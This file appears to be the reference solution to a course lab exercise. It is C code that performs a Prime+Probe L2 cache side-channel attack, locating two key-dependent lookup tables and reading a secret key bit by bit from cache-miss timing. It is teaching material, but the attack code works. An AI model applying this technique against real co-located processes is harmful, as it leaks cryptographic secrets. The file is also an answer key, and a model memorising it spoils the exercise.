/* Part 4 - REFERENCE SOLUTION (spoilers). Leak a key from key-dependent table accesses.
 *
 * Step 1 (Exercise 4-1): each table sits at a known page offset in an unknown 4 KiB page, so it can
 *   be in any of `colors = l2_sets / (page/line)` L2 sets. Watch every candidate for two key
 *   periods and build one "fraction of hot rounds per slot" profile per period. The right candidate
 *   is busy during that table's bits, idle during the gap, and does the same thing in both periods.
 *   Do not just pick the busiest candidate: with tree-PLRU a foreign line can get stuck in a primed
 *   set and make your own probe miss every round for a while. Score = covariance of the two
 *   profiles: constant activity and one-off activity both score ~0, periodic activity scores > 0.
 * Step 2 (Exercise 4-2): watch the two winners for several periods, fold the samples by the (known)
 *   period, find the idle gap, and read one bit per slot after it: table_one busier => 1.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "lab.h"

#define MAXW 32
#define NS KEY_TABLE_LINES /* we watch the sets of all lines of a table together */

typedef struct {
    uint8_t *ev[NS][MAXW];
    int n;
} group_t;

static const plat_geom_t *g;
static pool_t pool;

static int group_init(group_t *gr, unsigned first_set) {
    gr->n = g->l2_ways < MAXW ? g->l2_ways : MAXW;
    for (int j = 0; j < NS; j++)
        if (evset_build(&pool, (first_set + (unsigned)j) % (unsigned)g->l2_sets, gr->n, gr->ev[j]) < gr->n) return -1;
    return 0;
}
static void group_prime(group_t *gr) {
    for (int j = 0; j < NS; j++) pp_prime(gr->ev[j], gr->n);
}
/* misses summed over the group's sets */
static int group_probe(group_t *gr, const cal_t *cal) {
    int m = 0;
    for (int j = 0; j < NS; j++) m += pp_probe(gr->ev[j], gr->n, cal);
    return m;
}

/* A round is "hot" if the group lost at least HOT lines (victim: ~1 per table line touched). */
#define HOT 3

int leak_key(const cal_t *cal, int key_bits, uint8_t *bits) {
    g = plat_geom();
    for (int i = 0; i < key_bits; i++) bits[i] = 0xff;
    if (pool_init(&pool, (size_t)g->l2_sets * (size_t)g->line * (size_t)g->l2_ways * 2) || !pool.huge) return -1;

    unsigned lpp = (unsigned)(g->page / (size_t)g->line); /* lines per page = set bits known from offset */
    unsigned colors = (unsigned)g->l2_sets / lpp;
    unsigned idx[2] = {KEY_TABLE_ZERO_OFF / (unsigned)g->line, KEY_TABLE_ONE_OFF / (unsigned)g->line};
    uint64_t slot = KEY_SLOT_TICKS, nslots = (uint64_t)(KEY_GAP_SLOTS + key_bits), period = slot * nslots;
    uint64_t wait = slot / 40;

    /* ---- step 1: find the color (= unknown set bits) of each table ---- */
    enum { MAXS = KEY_GAP_SLOTS + 256 };
    unsigned best_set[2];
    for (int t = 0; t < 2; t++) {
        double best = -1e9;
        for (unsigned c = 0; c < colors; c++) {
            unsigned first = c * lpp + idx[t];
            group_t gr;
            if (group_init(&gr, first)) return -1;
            static double on[2][MAXS], cnt_s[2][MAXS];
            memset(on, 0, sizeof on);
            memset(cnt_s, 0, sizeof cnt_s);
            uint64_t start = plat_now(), end = start + 2 * period;
            group_prime(&gr);
            while (plat_now() < end) {
                group_prime(&gr);
                plat_wait(wait);
                int hot = group_probe(&gr, cal) >= HOT;
                uint64_t el = plat_now() - start;
                int p = el >= period;
                uint64_t k = (el / slot) % nslots;
                on[p][k] += hot;
                cnt_s[p][k] += 1;
            }
            double f[2][MAXS], m[2] = {0, 0};
            for (int p = 0; p < 2; p++) {
                for (uint64_t k = 0; k < nslots; k++) {
                    f[p][k] = cnt_s[p][k] > 0 ? on[p][k] / cnt_s[p][k] : 0;
                    m[p] += f[p][k] / (double)nslots;
                }
            }
            double cov = 0;
            for (uint64_t k = 0; k < nslots; k++) cov += (f[0][k] - m[0]) * (f[1][k] - m[1]) / (double)nslots;
            if (cov > best) { best = cov; best_set[t] = first; }
        }
        /* if a table is never used (all key bits equal) its "best" is just noise; step 2 copes */
    }

    /* ---- step 2: watch both, fold by the period ---- */
    enum { BPS = 6, MAXB = 6 * (KEY_GAP_SLOTS + 256) };
    int nb = (int)nslots * BPS;
    if (nb > MAXB) return -1;
    static double hz[MAXB], ho[MAXB], cnt[MAXB];
    memset(hz, 0, sizeof hz); memset(ho, 0, sizeof ho); memset(cnt, 0, sizeof cnt);
    group_t gz, go;
    if (group_init(&gz, best_set[0]) || group_init(&go, best_set[1])) return -1;
    uint64_t t0 = plat_now(), end = t0 + 5 * period;
    group_prime(&gz);
    group_prime(&go);
    while (plat_now() < end) {
        group_prime(&gz);
        group_prime(&go);
        plat_wait(wait);
        uint64_t t = plat_now();
        int mz = group_probe(&gz, cal), mo = group_probe(&go, cal);
        int b = (int)(((t - t0) % period) * (uint64_t)BPS / slot);
        if (b >= nb) b = nb - 1;
        hz[b] += mz >= HOT;
        ho[b] += mo >= HOT;
        cnt[b] += 1;
    }
    double act[MAXB];
    for (int b = 0; b < nb; b++) act[b] = cnt[b] > 0 ? (hz[b] + ho[b]) / cnt[b] : 0;

    /* the gap = the window of KEY_GAP_SLOTS slots with the least activity (circular) */
    int gw = KEY_GAP_SLOTS * BPS, gstart = 0;
    double gbest = 1e30;
    for (int s = 0; s < nb; s++) {
        double sum = 0;
        for (int k = 0; k < gw; k++) sum += act[(s + k) % nb];
        if (sum < gbest) { gbest = sum; gstart = s; }
    }
    /* bit i occupies the BPS bins starting at gstart + gw + i*BPS; skip the edge bins */
    for (int i = 0; i < key_bits; i++) {
        double z = 0, o = 0;
        for (int k = 1; k < BPS - 1; k++) {
            int b = (gstart + gw + i * BPS + k) % nb;
            if (cnt[b] > 0) { z += hz[b] / cnt[b]; o += ho[b] / cnt[b]; }
        }
        bits[i] = o > z ? 1 : 0;
    }
    return 0;
}
